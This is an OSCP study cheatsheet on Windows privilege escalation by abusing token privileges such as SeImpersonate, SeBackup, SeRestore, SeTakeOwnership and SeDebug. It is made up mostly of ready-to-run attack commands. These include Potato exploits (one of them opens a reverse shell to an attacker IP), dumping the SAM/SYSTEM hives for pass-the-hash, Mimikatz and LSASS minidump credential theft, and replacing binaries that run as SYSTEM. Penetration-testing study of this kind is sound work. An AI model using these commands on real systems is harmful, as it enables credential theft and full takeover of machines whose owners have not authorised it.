# Windows Privilege Tokens Cheatsheet

> Exploitable Windows token privileges for OSCP privilege escalation.

---

## Checking Your Privileges

```cmd
whoami /priv
```

Look for privileges marked as present — even **Disabled** ones can often still be abused. The privilege being assigned to your token is what matters, not whether it's currently enabled.

---

## Quick Reference Table

| Privilege | What it grants | Exploit approach |
|-----------|----------------|------------------|
| SeImpersonatePrivilege | Impersonate a client after auth | Potato attacks (PrintSpoofer, GodPotato, SigmaPotato) |
| SeAssignPrimaryTokenPrivilege | Assign primary token to process | Potato attacks |
| SeBackupPrivilege | Read ANY file (bypass read ACL) | robocopy /b, dump SAM/SYSTEM |
| SeRestorePrivilege | Write ANY file (bypass write ACL) | Overwrite system files, modify service binaries |
| SeTakeOwnershipPrivilege | Take ownership of any object | Take ownership of a file, then modify ACL |
| SeDebugPrivilege | Access memory of any process | Dump LSASS with Mimikatz |
| SeLoadDriverPrivilege | Load kernel drivers | Load vulnerable driver, exploit to SYSTEM |
| SeManageVolumePrivilege | Full volume access | Gain write access to protected files |

---

## SeImpersonatePrivilege (Most Common)

**What it does:** Lets you impersonate a client that connects to a named pipe you control. Abused to steal a SYSTEM token.

**When you have it:** Common on service accounts — NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL service accounts.

**Exploit tools (try in this order):**

```cmd
# PrintSpoofer - needs Spooler service running
.\PrintSpoofer64.exe -i -c cmd

# GodPotato - works on more modern Windows, needs matching .NET
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# SigmaPotato - newest, works where others fail
.\SigmaPotato.exe --revshell YOUR_IP 443
```

**If all Potatoes fail:** the box likely has no triggerable service (Spooler stopped, RPCSS restricted). Pivot to another privilege like SeBackupPrivilege.

---

## SeBackupPrivilege (Read Any File)

**What it does:** Backup software privilege — read any file bypassing ACLs. A read primitive, not full escalation.

**Method 1 — robocopy backup mode (simplest):**
```cmd
robocopy /b C:\Users\admin\Desktop C:\Users\youruser\Desktop flag.txt
type C:\Users\youruser\Desktop\flag.txt
```

**Method 2 — dump password hashes (full compromise):**
```cmd
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
```
Then on Kali:
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```
Pass-the-Hash the Administrator hash to get admin.

**Method 3 — SeBackupPrivilege PowerShell modules:**
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\protected\file.txt C:\temp\file.txt
```

---

## SeRestorePrivilege (Write Any File)

**What it does:** Write to any file bypassing ACLs. The write counterpart to SeBackup.

**Exploit approaches:**
- Overwrite a service binary that runs as SYSTEM, then restart it
- Modify a file in a protected location
- Registry manipulation via reg import

```powershell
# With the SeRestorePrivilege modules
Import-Module .\SeRestorePrivilege.dll
# Overwrite a SYSTEM-run binary, restart service
```

Common target: replace a service's exe or a scheduled task's script, then trigger it.

---

## SeTakeOwnershipPrivilege

**What it does:** Take ownership of any file or object. Once you own it, you can change its ACL to grant yourself full access.

**Exploit:**
```cmd
# Take ownership of a target file
takeown /f C:\Windows\System32\target.exe

# Grant yourself full control
icacls C:\Windows\System32\target.exe /grant youruser:F

# Now replace or modify it
```

Common target: take ownership of a binary run by a SYSTEM service, replace it, restart.

---

## SeDebugPrivilege

**What it does:** Access the memory of any process. Lets you dump credentials from LSASS.

**Exploit:**
```cmd
# With Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Or dump LSASS and extract offline:
```cmd
# Create LSASS dump
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```
Then on Kali:
```bash
pypykatz lsa minidump lsass.dmp
```

---

## SeLoadDriverPrivilege

**What it does:** Load kernel drivers. Abused by loading a known-vulnerable driver, then exploiting it for SYSTEM.

**Exploit:** More advanced — load a vulnerable driver (e.g., Capcom.sys) and exploit it. Rarely needed on OSCP; know it exists.

---

## Exploitation Decision Flow

```
whoami /priv
  |
  ├── SeImpersonate/SeAssignPrimaryToken?
  │     → Potato attack (PrintSpoofer → GodPotato → SigmaPotato)
  │     → If all fail (no triggerable service), pivot below
  │
  ├── SeBackupPrivilege?
  │     → robocopy /b to read flag, OR dump SAM/SYSTEM → PtH
  │
  ├── SeRestorePrivilege?
  │     → overwrite a SYSTEM service binary → restart
  │
  ├── SeTakeOwnershipPrivilege?
  │     → takeown + icacls a SYSTEM binary → replace
  │
  ├── SeDebugPrivilege?
  │     → Mimikatz sekurlsa::logonpasswords → creds
  │
  └── SeLoadDriverPrivilege?
        → load vulnerable driver → exploit (last resort)
```

---

## Key Notes

- **"Disabled" privileges are still usable** — they're assigned to your token and can be enabled on demand. Don't skip a privilege just because it shows Disabled.
- **SeImpersonate is the most common** and the most reliable when a triggerable service exists.
- **SeBackup/SeRestore/SeTakeOwnership** are the "backup operator" family — powerful read/write primitives that bypass ACLs.
- **Potato attacks fail** when Spooler is stopped and RPCSS triggers are restricted — have SeBackup/other privileges as backup plans.
- For just grabbing a flag, a **read primitive (SeBackup)** is enough; you don't always need full SYSTEM.

---

## Tools to Have Ready

| Tool | Purpose |
|------|---------|
| PrintSpoofer64.exe | SeImpersonate (Spooler-based) |
| GodPotato-NET4.exe | SeImpersonate (modern Windows) |
| SigmaPotato.exe | SeImpersonate (newest, built-in revshell) |
| SeBackupPrivilege DLLs | SeBackup file copy |
| mimikatz.exe | SeDebug credential dump |
| impacket-secretsdump | Extract hashes from SAM/SYSTEM |

---

## References

- HackTricks — Windows Token Privileges: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- Priv2Admin (privilege abuse guide): https://github.com/gtworek/Priv2Admin